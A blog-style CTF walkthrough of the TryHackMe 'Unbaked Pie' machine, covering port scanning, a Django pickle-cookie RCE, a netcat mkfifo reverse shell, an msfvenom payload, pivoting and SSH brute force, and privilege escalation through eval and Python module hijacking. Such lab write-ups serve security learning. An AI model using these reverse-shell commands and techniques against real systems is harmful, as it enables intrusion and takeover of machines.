---
title: TryHackMe Unbaked Pie Writeup
date: "2020-12-04T12:20:10.135Z"
description: Walkthrough and write up of the unbaked pie box on tryhackme.
---

## Enumeration

After spending some times enumerating the box for open ports, I only found one which is sitting at `5003`

We did that by typing the following

```bash
nmap -Pn -p- -vvvv -T5 10.10.99.12
```

After running another scan to enumerate the version/type of service running on that port using

```bash
nmap -Pn -sV -sC -p5003 10.10.99.12
```

We get the following results

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 03:44 EST
Nmap scan report for 10.10.99.12
Host is up (0.13s latency).

PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Fri, 04 Dec 2020 08:45:16 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=g2ZdduRBbbrSwrYfbBCp0rrxdInDhr2veQZjZi3iSzqpiBQ4lfLQbwrf6dbZPN5I; expires=Fri, 03 Dec 2021 08:45:16 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Fri, 04 Dec 2020 08:45:17 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=Y5zo88Im9Bh98zCvc8iINIZwCcSN1f2ZBvOgStVkfdsodENt613YOjUQvnTiYNvC; expires=Fri, 03 Dec 2021 08:45:17 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5003-TCP:V=7.91%I=7%D=12/4%Time=5FC9F711%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2004\x20Dec\x20
SF:2020\x2008:45:16\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.
SF:6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x
SF:20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Type-
SF:Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:\x
SF:20\x20csrftoken=g2ZdduRBbbrSwrYfbBCp0rrxdInDhr2veQZjZi3iSzqpiBQ4lfLQbwr
SF:f6dbZPN5I;\x20expires=Fri,\x2003\x20Dec\x202021\x2008:45:16\x20GMT;\x20
SF:Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-8\
SF:">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"de
SF:scription\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20conte
SF:nt=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20<!
SF:--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/static/
SF:vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n\x
SF:20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20\x
SF:20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs")%r(
SF:HTTPOptions,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2004\x20Dec\
SF:x202020\x2008:45:17\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.
SF:8\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options
SF::\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie
SF::\x20\x20csrftoken=Y5zo88Im9Bh98zCvc8iINIZwCcSN1f2ZBvOgStVkfdsodENt613Y
SF:OjUQvnTiYNvC;\x20expires=Fri,\x2003\x20Dec\x202021\x2008:45:17\x20GMT;\
SF:x20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf
SF:-8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\
SF:"description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20co
SF:ntent=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x2
SF:0<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/stat
SF:ic/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\
SF:n\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x2
SF:0\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.55 seconds
```

Now we know it's running on a python server using WSGI

So we visit the port using our web browser and encounter a web application, After trying to visit `/robots.txt` we get this image

![Image](https://i.imgur.com/PQ9wfoR.png)

Which indicates that the web application is running using `Django`. And that came as an amazing surprise as I've been developing using Django for years now.

I know there will be no use to enumerate more using dirbuster or gobuster because we already know all of the urls that could exist in the application.

I start off by visiting each of them and trying to find a clue or usefull information.

I noticed most of the urls require me to be authenticated so I quickly created a random user and now I can safely access the urls.

The most interesting one was the `/search` url which gave me this error message.

![Image](https://i.imgur.com/CisgV8n.png)

Now if you `click` on the place that says `'results': results,` it will actually expand the code a little bit and might show you something interesting like the following.

![Image](https://i.imgur.com/6dUBaXw.png)

As soon as I saw line `53` I knew exactly what to do, it was unpacking something called `query` with `pickle`
And if you can control what `pickle` loads, you should have the ability to run remote code execution on this web application.

## Exploitation

1. We start using Burp Suite to intercept all calls being made to the web application.
2. We visit the home page again and in the top right corner we can see a `Search box`, we typed something random like `test` and send it.

![Image](https://i.imgur.com/mO2uDLq.png)

3. In the response of that request we can see that we are set a specific cookie called `search_cookie`, and upon decoding it using base64 we can see some random stuff then `test` which is our search query.

![Image](https://i.imgur.com/I53DZFn.png)

4. Upon sending another search request with the value `test2` the same process happens, we send a `query` and we get back a new `search_cookie`
5. Now we have a good idea of what's happening, the server probably `loads` the `search_cookie` whenever we send a new search request, so let's create our exploit! I'll use this to create my payload `https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd`
6. Change the `DEFAULT_COMMAND` to be something like

```python
DEFAULT_COMMAND = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | nc YOUR_IP 1234 > /tmp/f')
```

7. Run the python script and it should generate a payload for you, replace the existing `search_cookie` with the output of this python script and start a netcat listner at port `1234`. After that send a new search request with any query while having the new payload inside the `search_cookie` and you should pop the inital shell !

![Image](https://i.imgur.com/8IQdPGm.png)

![Image](https://i.imgur.com/tzFpJNd.png)

## Post-Exploitation

1. You should notice you are root straight away... something smells fishy about this.
2. Upon further investigation we find that we are actually inside of a docker container, you can check by doing `ls -la /` and you should find `.dockerenv` file there
3. Also doing `ip addr` should show us that our current ip address is at `172.17.0.2`
   ![Image](https://i.imgur.com/j547CHs.png)
4. We started searching the file system for any clues with no luck, until we looked inside `/root/.bash_history`
5. We can see that the owner of this box tried to `call home` by sshing into a user called `ramsey` at `172.16.0.1`
6. Sadly this current container doesn't have SSH client installed so I resoted to using metasploit for pivoting as I find it easier to manage.
7. In our Kali/Parrot machine we can create the payload by typing the following command.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.14.176 LPORT=9999 -f elf > payload.elf
```

8. After that let's start metasploit using `msfconsole` and starting a `multi/handler`

   ![Image](https://i.imgur.com/T6jOpT0.png)

9. Then we can use `wget` to get that payload into the remote server, set it as executable and run it.

![Image](https://i.imgur.com/hftwexL.png)

10. The reason we used a metasploit shell there was to pivot into the internal network. So let's start a socks4a server to use with proxychains

![Image](https://i.imgur.com/HwxwRnU.png)

11. Now we can interact with the open session and setup our autoroute like this.

    ![Image](https://i.imgur.com/aZJ0ZYX.png)

12. Now you need to configuration proxychains to work with metasploit, edit the file `/etc/proxychains.conf` and either make sure this line is at the bottom or add it
    ```
    socks4 127.0.0.1 1080
    ```
13. Now we have the ability to communicate with that internal server using proxychains and metasploit, Try doing the following:

    ```bash
    ssh ramsey@172.17.0.1
    # And it should fail, but if you try the same command with proxychains it should work
    proxychains ssh ramsey@172.17.0.1
    ```

    ![Image](https://i.imgur.com/aGznqiU.png)

14. I persoanlly tried running hydra again this SSH server using proxychains but it failed, so instead I used a metasploit module to run the bruteforce attack.

    ![Image](https://i.imgur.com/jsQ3Gqs.png)

15. Setup the module so it attacks the host `172.17.0.1` with the username `ramsey` and the password list of `rockyou.txt` and run the attack, and it shouldn't take that long before actually getting back a result.
    ![Image](https://i.imgur.com/L7CYKSU.png)
16. Now that we know the password we can try to SSH into the box.

    ![Image](https://i.imgur.com/ZPuKt8K.png)

17. And we can find the user flag by typing `cat user.txt` **sorry no easy flags here**.

## Privilage Escilation

1. Now we own the user `ramsey` in the internal machine let's enumerate what the user can actually do. start with `sudo -l` to see the sudo privilages that he has.

2. We can this this python script `vuln.py` as the user `oliver`... interesting Let's checkout vuln.py for more information.

   ![Image](https://i.imgur.com/KECVZ3E.png)

3. Right where it uses `eval(LISTED)` we know that the vulnerability is most likely there as it would give us the ability to execute commands as the user `oliver`. It seems this script will actualy analiyze/read the file `payload.png` and try to execute whatever is inside that image
4. After opening up the payload.png we can see it says `2+2` so realistically if we change that payload.png into an image that says `os.system('/bin/bash')` we could get a shell access. And that is exactly what we did!

   ![Image](https://i.imgur.com/AyVHyvB.png)

5. After replacing the `payload.png` with the image above and running the script while selecting the 2nd option we do get a shell back! (I added some spaces because it made it easier for the script to actually read quotes).

   ![Image](https://i.imgur.com/wsjiz1H.png)

   ```bash
   sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
   ```

![Image](https://i.imgur.com/ahuKMjM.png)

6. Amazing! we are the user `oliver` now! let's enumerate what this user can do with `sudo -l`

![Image](https://i.imgur.com/RsWDFR3.png)

7. So it seems like I can run a python script as `root` and I can also control the enviorment variables `Look at SETENV`
8. The `dockerScript.py` contains the following.

   ![Image](https://i.imgur.com/ajHFExZ.png)

9. So we can control which `docker` file can we import within this python script if we change the `PYTHONENV` enviorment variable!
10. First let's create a new file called `docker.py` inside the folder of `/home/oliver/` and inside of it let's place a little backdoor like the following:

    ```python
    import os
    os.system('/bin/bash')
    ```

![Image](https://i.imgur.com/jWEbrAt.png)

And we got root! Thanks for reading my first ever writeup xD
